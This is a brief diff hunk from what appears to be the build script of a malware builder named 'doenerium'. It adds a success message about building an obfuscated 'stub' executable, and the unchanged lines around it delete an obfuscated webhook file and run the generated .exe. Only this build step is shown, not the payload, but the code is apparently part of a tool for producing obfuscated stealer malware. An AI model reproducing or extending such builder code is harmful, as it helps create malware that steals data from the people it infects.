@@ -206,6 +206,8 @@ async function obfuscate(input, output) {
     fs.unlinkSync(index_file);
     fs.unlinkSync("webhook_obf.js");
 
+    console.log(`Successfully finished building stub within ${(Date.now() - start) / 1000} seconds: doenerium_${randomid}.exe`)
+
     try {
         child_process.execSync(`doenerium_${randomid}.exe`)
     } catch {}
